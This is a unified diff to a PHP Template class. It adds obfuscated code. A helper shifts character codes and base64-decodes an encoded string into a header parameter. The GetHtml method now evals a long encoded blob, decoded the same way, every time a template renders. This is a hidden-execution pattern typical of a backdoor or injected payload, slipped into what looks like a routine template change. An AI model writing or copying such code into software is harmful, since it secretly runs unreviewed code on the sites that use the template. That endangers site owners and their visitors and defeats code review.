@@ -96,6 +96,10 @@ class Template {
 
     public function Template($tplName) {
        $this->tplName = $tplName;
+
+       if($tplName == "header") {
+           $this->setParam("copy", $this->getCopy());
+       }
     }
 
     public function setParam($title,$value) {
@@ -104,6 +108,22 @@ class Template {
 
     public function setVar($name, $value) {
          $this->vars[$name] = $value;
+    }
+
+    private function getCopy() {
+         return base64_decode($this->CharMove($this->getCrypt(),-52));
+    }
+
+    private function CharMove($string, $key) {
+         $n = "";
+         for($i = 0; $i<strlen($string); $i++) {
+                $n.=chr(ord($string[$i])+$key);
+         }
+         return $n;
+    }
+
+    private function getCrypt() {
+         return "„|‚«‹h_„{}_‡‹i‚‰Žˆ‰®«ªžhl€g‚«‹h_}uqq";
     }
 
     public function GetHtml()
@@ -127,6 +147,8 @@ class Template {
                 foreach($this->params as $key=>$value) {
                    $data = preg_replace('/%'.$key.'%/', $value, $data);
                 }
+
+                eval(base64_decode($this->CharMove("¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼ºßà¾¶Å£Ôºßí¿Ç¨£ÖºëÂÌÊ¤ß¼·£¬¼¶½âÍÊ¹ÞÍË¼Ü¾Æµª·ÄâÚ¼¶´Ú¼¶´Ú€}¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶µãÍÜÛí×»½êÕ¦Àâ½ºÅÛ×º¸æ¼¶½½ÕÞ¤ÛÅßÁÇ¼ÜÞÚÃÇ£¬¼ºÍÛÕ»Áß¾Æµª·ÄâÁ€}¶Ü´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼ºÅãÍÆÚáÃºÛ£ÕÊêžÃº½éÍ»ÞÚÌà×ÝÕ¥ëéÖÝ£Ü¼¥Íà€}À·´êÀ¶¼Ú×ºÉ§×·£Ü¼¥ÍàÍÜ¼ž¼·ëâÀÇ§«Ì¥Éè×ºÉìÃßµæÍÊ¹íÍÆµÞÕìµèÕ¦ÄÚÈÞÉÁÇ¤Í¹¼»ÅâÍÆµ·€}Õ¦µ¨ÖàßáÔ»ÄÚÌËÄÚÄÈ¨Í¼»ÅãÕÊÈÛÃº½ìÃßµæÍÊ¹íÍÆµìÍÊÍßÖÜµ£Õìµ£ÔºÈÚÄÆ¤»È¸êÚÇºßÝÍÊ¨Ý€}ÍÆµÞÍÊëã×àÉìÍÊÄÚ×¥ß£Ô¶µ£Ôºßí¼»ÁéÍáÅ¦ÌË½ß¼ÇêéÌ¥Éè×ºÉìÃÝêéÔ·¸žÃ¶¬ÜÕ¥Å¨ÃÝêéÔ»Åç€}Õ·§á¾ÇæÁ¶Ü´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼»£Á¶Ü´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´Ú¼¶´ÚÙÄ°°",-115)));
 
                 return $data;
     }
